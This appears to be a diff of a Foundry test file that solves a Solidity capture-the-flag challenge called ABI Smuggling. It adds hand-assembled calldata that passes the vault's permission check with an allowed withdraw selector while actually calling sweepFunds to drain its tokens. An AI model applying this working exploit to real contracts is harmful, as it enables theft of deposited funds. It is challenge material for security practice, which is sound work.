@@ -37,7 +37,9 @@ contract ABISmugglingChallenge is Test {
 
         // Set permissions in the vault
         bytes32 deployerPermission = vault.getActionId(hex"85fb709d", deployer, address(vault));
+        //  sweepFunds(address,address)
         bytes32 playerPermission = vault.getActionId(hex"d9caed12", player, address(vault));
+        // 	withdraw(address,address,uint256)
         bytes32[] memory permissions = new bytes32[](2);
         permissions[0] = deployerPermission;
         permissions[1] = playerPermission;
@@ -74,6 +76,28 @@ contract ABISmugglingChallenge is Test {
      */
     function test_abiSmuggling() public checkSolvedByPlayer {
         
+        address vaultaddress = address(vault);
+        bytes memory data = abi.encodeWithSignature("sweepFunds(address,address)", recovery, address(token));
+        uint256 datalength = data.length;
+        bytes memory executeData = new bytes(datalength + 164);
+
+        for (uint256 i = 0; i < datalength; i++) {
+            executeData[i + 164] = data[i];
+        }
+        assembly {
+            mstore(add(executeData, 0x20), shl(224, 0x1cff79cd)) // execute(address,bytes)
+            mstore(add(executeData, 0x24), vaultaddress)
+            mstore(add(executeData, 0x44), 0x80)
+            mstore(add(executeData, 0x64), 0x00)
+            mstore(add(executeData, 0x84), shl(224, 0xd9caed12)) // withdraw(address,address,uint256)
+            mstore(add(executeData, 0xa4), datalength)
+            let success := call(gas(), vaultaddress, 0, add(executeData, 0x20), mload(executeData), 0, 0)
+            if iszero(success) {
+                mstore(0x00, 0x08c379a0) // Error(string)
+                revert(0x1c, 0x04)
+            }
+
+        }
     }
 
     /**
